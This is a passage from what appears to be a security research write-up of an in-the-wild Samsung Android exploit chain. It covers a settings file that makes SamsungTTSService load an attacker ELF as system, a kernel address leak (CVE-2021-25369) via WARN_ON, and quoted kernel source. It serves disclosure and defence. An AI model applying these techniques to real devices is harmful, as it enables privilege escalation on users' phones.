class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c25\"&gt;&amp;lt;map&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c25\"&gt;&amp;lt;string&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;name&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;\\&amp;quot;eng-USA-Variant Info\\&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c25\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;f00&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c25\"&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;\\n&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c25\"&gt;&amp;lt;string&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;name&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;\\&amp;quot;SMT_STUBCHECK_STATUS\\&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c25\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;STUB_SUCCESS&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c25\"&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;\\n&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c25\"&gt;&amp;lt;string&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;name&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;\\&amp;quot;SMT_LATEST_INSTALLED_ENGINE_PATH\\&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c25\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;/data/system/users/0/newFile.bin&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c25\"&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;\\n&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c25\"&gt;&amp;lt;/map&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;SMT_LATEST_INSTALLED_ENGINE_PATH&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the file path passed to &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;System.load()&lt;/span&gt;&lt;span&gt;. To initiate the process of the system loading, the exploit stops and restarts the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;SamsungTTSService&lt;/span&gt;&lt;span&gt;&amp;nbsp;by sending two intents to the application. The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;SamsungTTSService&lt;/span&gt;&lt;span&gt;&amp;nbsp;then initiates the load and the stage 2 ELF begins executing as the system user in the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;system_app&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;SELinux context. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;The exploit sample is from at least November 2020. As of November 2020, some devices had a version of the SamsungTTS app that did this arbitrary file loading while others did not. App versions 3.0.04.14 and before included the arbitrary loading capability. It seems like devices released on Android 10 (Q) were released with the updated version of the SamsungTTS app which did not load an ELF file based on the path in the settings file. For example, the A51 device that launched in late 2019 on Android 10 launched with version 3.0.08.18 of the SamsungTTS app, which does not include the functionality that would load the ELF.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;Phones released on Android P and earlier seemed to have a version of the app pre-3.0.08.18 which does load the executable up through December 2020. For example, the SamsungTTS app from &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://www.sammobile.com/samsung/galaxy-a50/firmware/SM-A505F/XID/download/A505FDDS5BTJA/517463/\"&gt;this A50 device&lt;/a&gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;on the November 2020 security patch level was 3.0.03.22, which did load from the Settings file. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;Once the ELF file is loaded via the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;System.load&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;api, it begins executing. It includes two additional exploits to gain kernel read and write privileges as the root user.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"vdnyYxSRCi-c28 vdnyYxSRCi-c8\" id=\"h.4iueiufi5tqe\"&gt;&lt;span class=\"vdnyYxSRCi-c31\"&gt;Vulnerability #2 - task_struct and sys_call_table address leak&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;Once the second stage ELF is running (and as system), the exploit then continues. The second vulnerability (CVE-2021-25369) used by the chain is an information leak to leak the address of the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;task_struct&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;sy&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;s_call_tab&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;le&lt;/span&gt;&lt;span&gt;. The leaked &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;sys_call_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;address is used to defeat KASLR. The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointer, which is used later to gain arbitrary kernel read and write, is calculated from the leaked &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;task_struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;address.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The vulnerability is in the access permissions of a custom Samsung logging file: &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;/data/log/sec_log.log&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTUlyiPJg1awjnkx_0jTgZw-hLYtjWLrtD4kRaCW0J6sj9FGrAbEgC_nDgM36G5ctdm9r1iHukN2Wt7YivoW1znRECs_cNdoISTW_mzkF0Ylh48-zsoLsEzlWOJ8iLnSFejIzSYGG5t7lbfNMuNt3v-01FpJcWsYQmtT01kB3AQVV58nSgiCKmjqOa/s1103/image3.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTUlyiPJg1awjnkx_0jTgZw-hLYtjWLrtD4kRaCW0J6sj9FGrAbEgC_nDgM36G5ctdm9r1iHukN2Wt7YivoW1znRECs_cNdoISTW_mzkF0Ylh48-zsoLsEzlWOJ8iLnSFejIzSYGG5t7lbfNMuNt3v-01FpJcWsYQmtT01kB3AQVV58nSgiCKmjqOa/s1103/image3.png\" border=\"0\" alt=\"Screenshot of the CVE-2021-25369 entry from Samsung&amp;#39;s March 2021 security update. It reads: &amp;amp;quot;SVE-2021-19897 (CVE-2021-25369): Potential kernel information exposure from sec_log &amp;nbsp;Severity: Moderate Affected versions: O(8.x), P(9.0), Q(10.0) Reported on: December 10, 2020 Disclosure status: Privately disclosed. An improper access control vulnerability in sec_log file prior to SMR MAR-2021 Release 1 exposes sensitive kernel information to userspace. The patch removes vulnerable file.\" style=\"max-height: 750px; max-width: 600px;\"title=\"Screenshot of the CVE-2021-25369 entry from Samsung&amp;#39;s March 2021 security update. It reads: &amp;amp;quot;SVE-2021-19897 (CVE-2021-25369): Potential kernel information exposure from sec_log &amp;nbsp;Severity: Moderate Affected versions: O(8.x), P(9.0), Q(10.0) Reported on: December 10, 2020 Disclosure status: Privately disclosed. An improper access control vulnerability in sec_log file prior to SMR MAR-2021 Release 1 exposes sensitive kernel information to userspace. The patch removes vulnerable file.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The exploit abused a &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;WARN_ON&lt;/span&gt;&lt;span&gt;&amp;nbsp;in order to leak the two kernel addresses and therefore break ASLR&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;WARN_ON&lt;/span&gt;&lt;span&gt;&amp;nbsp;is intended to only be used in situations where a kernel bug is detected because it prints a full backtrace, including stack trace and register values, to the kernel logging buffer, &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;/dev/kmsg&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c2 vdnyYxSRCi-c33 vdnyYxSRCi-c44\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.dac6441018d72ea602c04b6dc61a0ad5d92c980f\"&gt;&lt;/a&gt;&lt;a id=\"t.5\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;oid __warn&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;const&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;char&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;int&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;line&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;void&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;caller&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;unsigned&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;taint&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;pt_regs &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;regs&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;warn_args &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;args&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; disable_trace_on_warning&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pr_warn&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;------------[ cut here ]------------\\n&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pr_warn&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;WARNING: CPU: %d PID: %d at %s:%d %pS\\n&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; raw_smp_processor_id&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(),&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;current&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;pid&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;line&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;caller&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;else&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pr_warn&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;WARNING: CPU: %d PID: %d at %pS\\n&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; raw_smp_processor_id&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(),&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;current&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;pid&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;caller&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;args&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; vprintk&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;args&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;fmt&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;args&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;args&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;panic_on_warn&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* This thread may hit another WARN() in the panic path.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Resetting this prevents additional WARN() from panicking the&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* system on this thread. &amp;nbsp;Other threads are blocked by the&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* panic_mutex in panic().&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; panic_on_warn &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; panic&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;panic_on_warn set ...\\n&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span 